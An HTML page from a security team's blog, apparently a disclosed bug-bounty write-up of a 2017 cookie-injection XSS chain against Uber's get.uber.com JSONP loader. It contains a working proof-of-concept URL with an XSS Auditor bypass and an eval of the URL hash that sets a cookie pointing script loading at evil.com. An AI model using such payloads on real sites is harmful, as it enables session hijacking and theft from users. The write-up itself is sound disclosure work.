@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="">
+	<meta charset="UTF-8">
+<!-- <link rel="icon" type="image/x-icon" href="/statics/img/favicon.ico"> -->
+<title>
+	
+		Uber XSS via Cookie -
+	
+	Symbo1
+</title>
+
+<meta name="theme-color" content="#232323">
+<meta name="description" content="Symbo1 Security Team Post.">
+<meta name="keywords" content="">
+<meta name="author" content="Tr3jer_CongRong.">
+<link rel="alternate" type="application/rss+xml" title="Symbo1's RSS Feed" href="/feed.xml">
+<link rel="stylesheet" type="text/css" href="/statics/css/style.css">
+
+
+
+	<body>
+		<header>
+	<pre class="ascii name">
+  ____                        _               _ 
+ / ___|   _   _   _ __ ___   | |__     ___   / |
+ \___ \  | | | | | '_ ` _ \  | '_ \   / _ \  | |
+  ___) | | |_| | | | | | | | | |_) | | (_) | | |
+ |____/   \__, | |_| |_| |_| |_.__/   \___/  |_|
+          |___/                                 
+          	Security Team.
+	</pre>
+</header>
+		<nav>
+	<ul>
+		<li><a href="/">Index</a></li>&nbsp;&nbsp;|
+		<li><a href="/acknowledgement">Acknowledgement</a></li>&nbsp;&nbsp;|
+		<li><a href="/archives">Archives</a></li>&nbsp;&nbsp;|
+		<li><a href="http://github.com/symbo1" target="_blank">Projects</a></li>&nbsp;&nbsp;|
+		<li><a href="/members">Members</a></li>&nbsp;&nbsp;|
+		<li><a href="/about">About</a></li>
+	</ul>
+</nav>
+
+		<main>
+			<style>
+	body{
+		word-break:break-word;
+	}
+</style>
+
+<div class="post-content">
+<div id="post">
+<h1 align="center">Uber XSS via Cookie</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">30 Aug 2017 - zhchbin</p>
+
+<p>   This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.</p>
+
+<h2 id="jsonp-request">JSONP Request</h2>
+
+<p>   Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was jsonp, and my target domain was <code class="highlighter-rouge">https://get.uber.com</code>. Let’s look at what I had found at that time.</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">idrCall</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">;</span>
+    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">idrCallPending</span> <span class="p">?</span> <span class="k">void</span> <span class="mi">0</span> <span class="p">:</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"making idr call"</span><span class="p">),</span>
+    <span class="nx">a</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">rfiServer</span> <span class="p">?</span> <span class="k">this</span><span class="p">.</span><span class="nx">rfiServer</span> <span class="p">:</span> <span class="s2">"a.rfihub.com"</span><span class="p">,</span>
+    <span class="nx">b</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">getProtocol</span><span class="p">()</span> <span class="o">+</span> <span class="s2">"//"</span> <span class="o">+</span> <span class="nx">a</span> <span class="o">+</span> <span class="s2">"/idr.js"</span><span class="p">,</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">jsonpGet</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="p">{},</span> <span class="k">this</span><span class="p">.</span><span class="nx">idrCallback</span><span class="p">,</span> <span class="s2">"cmZpSWRJbkNhY2hl"</span><span class="p">),</span>
+    <span class="k">this</span><span class="p">.</span><span class="nx">idrCallPending</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span><span class="p">)</span>
+<span class="p">},</span></code></pre></figure>
+
+<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg" /></p>
+
+<p>   Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code class="highlighter-rouge">this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know the essence of JSONP. The next step was searching everything about <code class="highlighter-rouge">rfiServer</code>.</p>
+
+<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg" /></p>
+
+<p>After reading through these lines of code:</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">a</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">readCookie</span><span class="p">(</span><span class="s2">"_rfiServer"</span><span class="p">),</span>
+<span class="kc">null</span> <span class="o">!=</span> <span class="nx">a</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">setRfiServer</span><span class="p">(</span><span class="nx">a</span><span class="p">),</span></code></pre></figure>
+
+<p>   We could get the information that the initial value of <code class="highlighter-rouge">this.rfiServer</code> was set by using value of cookie <code class="highlighter-rouge">_rfiServer</code> if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:</p>
+
+<ul>
+  <li>HTTP Header CRLF Injection at any subdomain of uber.com</li>
+  <li>XSS at any subdomain of uber.com</li>
+</ul>
+
+<p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p>
+
+<h2 id="the-feature-of-cookie">The Feature of Cookie</h2>
+
+<p>   Any subdomain of uber.com can set cookie with domain <code class="highlighter-rouge">.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code class="highlighter-rouge">xxx.uber.com</code> using following code, then <code class="highlighter-rouge">get.uber.com</code> will use the cookie value.</p>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="s1">'_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span></code></pre></figure>
+
+<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg" /></p>
+
+<h2 id="xss-of-ubercom-which-is-out-of-scope">XSS of .uber.com which is Out of Scope</h2>
+
+<p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code class="highlighter-rouge">&lt;redacted&gt;.uber.com</code> for demo.</p>
+
+<p><img src="https://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg" /></p>
+
+<ol>
+  <li><code class="highlighter-rouge">"</code> is reflected and not encoded. We can inject any attribution into <code class="highlighter-rouge">input</code> tag.</li>
+  <li><code class="highlighter-rouge">type="text"</code> is after the injection point. So we can inject <code class="highlighter-rouge">type="image" src="1" onerror="alert(1)"</code>. Note that when there is two types, the second one will be ignored.</li>
+  <li><code class="highlighter-rouge">&gt;</code> is removed!!! This can be used to bypass Chrome XSS Auditor. How? <code class="highlighter-rouge">o&gt;nerror.</code></li>
+</ol>
+
+<h2 id="summary">Summary</h2>
+
+<ol>
+  <li>Use reflected XSS of <code class="highlighter-rouge">&lt;redacted&gt;.uber.com</code> to set the value of <code class="highlighter-rouge">_rfiServer </code>cookie to <code class="highlighter-rouge">evil.com</code></li>
+  <li>Visit <code class="highlighter-rouge">get.uber.com</code>, JSONP request to <code class="highlighter-rouge">https://evil.com/idr.js</code>, XSS of <code class="highlighter-rouge">get.uber.com</code> is done.</li>
+  <li>The final PoC</li>
+</ol>
+
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">https</span><span class="p">:</span><span class="c1">//&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span>
+<span class="nx">email</span><span class="o">=</span><span class="nx">aaa</span><span class="s2">"%20type%3d"</span><span class="nx">image</span><span class="s2">"%20src%3d1%20o&gt;nerror%3d"</span><span class="kr">eval</span><span class="p">(</span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span>
+<span class="err">#</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">=</span><span class="s1">'_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/'</span><span class="p">;</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">"https://get.uber.com"</span><span class="p">;</span></code></pre></figure>
+
+<p>Thanks for Uber. Reward: 5k</p>
+
+
+</div>
+</div>
+		</main>
+		
+			<footer>
+	<div id="disqus_thread"></div>
+<script>
+
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://www-symbo1-com.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</footer>
+		
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
